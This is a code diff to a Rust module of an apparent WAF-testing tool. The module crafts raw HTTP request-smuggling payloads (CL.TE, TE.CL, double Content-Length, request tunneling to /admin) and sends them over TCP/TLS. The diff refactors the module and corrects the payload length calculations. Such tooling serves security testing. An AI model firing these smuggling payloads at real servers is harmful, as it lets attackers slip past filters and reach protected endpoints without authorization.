@@ -1,3 +1,4 @@
+use crate::constants::waf;
 use crate::error::Result;
 use reqwest::Client;
 use rustls::pki_types::ServerName;
@@ -12,6 +13,12 @@ use tokio_rustls::TlsConnector;
 use super::{BypassResult, BypassTechnique, WafProfile};
 use crate::waf::detector::WafDetectionResult;
 
+/// HTTP smuggling bypass using raw TCP sockets.
+///
+/// Note: The `profile` field is accepted for API consistency with other bypass engines
+/// but is not currently used. Smuggling techniques use fixed payloads and raw sockets
+/// rather than profile-specific configurations. Profile-based smuggling customization
+/// is a future enhancement.
 pub struct SmugglingBypass {
     _profile: Option<WafProfile>,
 }
@@ -57,6 +64,7 @@ impl SmugglingBypass {
         let smuggling_requests = self.generate_smuggling_requests(&normalized_url);
 
         for smug_req in smuggling_requests {
+            let technique = Self::technique_for_type(&smug_req.smuggling_type);
             match self
                 .test_smuggling(&normalized_url, &smug_req, detection)
                 .await
@@ -64,7 +72,7 @@ impl SmugglingBypass {
                 Ok(result) => results.push(result),
                 Err(e) => {
                     results.push(BypassResult {
-                        technique: BypassTechnique::ContentLengthConflict,
+                        technique,
                         success: false,
                         description: format!("{} - Error: {}", smug_req.description, e),
                         payload: None,
@@ -85,16 +93,17 @@ impl SmugglingBypass {
 
         let mut requests = Vec::with_capacity(6);
 
-        let body = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
+        let smuggled = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
+        let clte_body = format!("0\r\n\r\n{}", smuggled);
         requests.push(SmugglingRequest {
             smuggling_type: SmugglingType::ClTe,
             method: "POST".to_string(),
             path: path.to_string(),
             headers: vec![
-                ("Content-Length".to_string(), format!("{}", body.len())),
+                ("Content-Length".to_string(), format!("{}", clte_body.len())),
                 ("Transfer-Encoding".to_string(), "chunked".to_string()),
             ],
-            body: format!("0\r\n\r\n{}", body).into_bytes(),
+            body: clte_body.into_bytes(),
             description: "CL.TE: Content-Length vs Transfer-Encoding".to_string(),
         });
 
@@ -160,7 +169,6 @@ impl SmugglingBypass {
         requests
     }
 
-    #[allow(clippy::vec_init_then_push)]
     fn generate_advanced_smuggling(&self, path: &str) -> Vec<SmugglingRequest> {
         let mut requests = Vec::new();
 
@@ -176,14 +184,13 @@ impl SmugglingBypass {
             description: "Double Content-Length header".to_string(),
         });
 
+        let tunnel_body = "GET /admin HTTP/1.1\r\nHost: localhost\r\nX-WAF-Bypass: true\r\n\r\n";
         requests.push(SmugglingRequest {
             smuggling_type: SmugglingType::RequestTunneling,
             method: "POST".to_string(),
             path: path.to_string(),
-            headers: vec![("Content-Length".to_string(), "88".to_string())],
-            body: "GET /admin HTTP/1.1\r\nHost: localhost\r\nX-WAF-Bypass: true\r\n\r\n"
-                .as_bytes()
-                .to_vec(),
+            headers: vec![("Content-Length".to_string(), format!("{}", tunnel_body.len()))],
+            body: tunnel_body.as_bytes().to_vec(),
             description: "Request tunneling via body".to_string(),
         });
 
@@ -275,16 +282,7 @@ impl SmugglingBypass {
 
         let success = !requires_http2 && self.is_bypass_successful(status, detection, "", &body);
 
-        let technique = match req.smuggling_type {
-            SmugglingType::ClTe => BypassTechnique::ContentLengthConflict,
-            SmugglingType::TeCl => BypassTechnique::TransferEncodingConflict,
-            SmugglingType::ChunkedMalformed => BypassTechnique::ChunkedEncoding,
-            SmugglingType::RequestTunneling => BypassTechnique::HeaderManipulation,
-            SmugglingType::H2CUpgrade => BypassTechnique::EncodingBypass,
-            SmugglingType::Http2Frame => BypassTechnique::EncodingBypass,
-            SmugglingType::DoubleContentLength => BypassTechnique::ContentLengthConflict,
-            SmugglingType::MultipartMixed => BypassTechnique::HeaderManipulation,
-        };
+        let technique = Self::technique_for_type(&req.smuggling_type);
 
         Ok(BypassResult {
             technique,
@@ -295,6 +293,19 @@ impl SmugglingBypass {
             response_diff: None,
             error: None,
         })
+    }
+
+    fn technique_for_type(smuggling_type: &SmugglingType) -> BypassTechnique {
+        match smuggling_type {
+            SmugglingType::ClTe => BypassTechnique::ContentLengthConflict,
+            SmugglingType::TeCl => BypassTechnique::TransferEncodingConflict,
+            SmugglingType::ChunkedMalformed => BypassTechnique::ChunkedEncoding,
+            SmugglingType::RequestTunneling => BypassTechnique::HeaderManipulation,
+            SmugglingType::H2CUpgrade => BypassTechnique::EncodingBypass,
+            SmugglingType::Http2Frame => BypassTechnique::EncodingBypass,
+            SmugglingType::DoubleContentLength => BypassTechnique::ContentLengthConflict,
+            SmugglingType::MultipartMixed => BypassTechnique::HeaderManipulation,
+        }
     }
 
     fn supports_http2_probes() -> bool {
@@ -331,7 +342,7 @@ impl SmugglingBypass {
             _ => 80,
         });
         let authority = format!("{}:{}", host, port);
-        let stream = timeout(Duration::from_secs(15), TcpStream::connect(&authority)).await??;
+        let stream = timeout(Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS), TcpStream::connect(&authority)).await??;
 
         let mut request_bytes = self.build_raw_request(host, req);
         let mut response = Vec::new();
@@ -340,7 +351,7 @@ impl SmugglingBypass {
                 let mut plain = stream;
                 plain.write_all(&request_bytes).await?;
                 plain.flush().await?;
-                timeout(Duration::from_secs(15), plain.read_to_end(&mut response)).await??;
+                timeout(Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS), plain.read_to_end(&mut response)).await??;
             }
             "https" => {
                 let connector = Self::build_tls_connector();
@@ -351,17 +362,17 @@ impl SmugglingBypass {
                     ))
                 })?;
                 let mut tls = timeout(
-                    Duration::from_secs(15),
+                    Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS),
                     connector.connect(server_name, stream),
                 )
                 .await
                 .map_err(|_| crate::error::SlapperError::Timeout {
-                    timeout_ms: 15_000,
+                    timeout_ms: waf::SMUGGLING_TIMEOUT_MS,
                     operation: format!("TLS connect {}", authority),
                 })??;
                 tls.write_all(&request_bytes).await?;
                 tls.flush().await?;
-                timeout(Duration::from_secs(15), tls.read_to_end(&mut response)).await??;
+                timeout(Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS), tls.read_to_end(&mut response)).await??;
             }
             other => {
                 return Err(crate::error::SlapperError::Validation(format!(
@@ -455,7 +466,6 @@ mod tests {
     }
 }
 
-#[allow(dead_code)]
 pub fn generate_cl_te_payloads() -> Vec<String> {
     vec![
         "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n".to_string(),
@@ -463,10 +473,10 @@ pub fn generate_cl_te_payloads() -> Vec<String> {
     ]
 }
 
-#[allow(dead_code)]
 pub fn generate_te_cl_payloads() -> Vec<String> {
     vec![
         "5\r\nhello\r\n0\r\n\r\n".to_string(),
         "e\r\nGET / HTTP/1.1\r\n\r\n0\r\n\r\n".to_string(),
     ]
 }
+
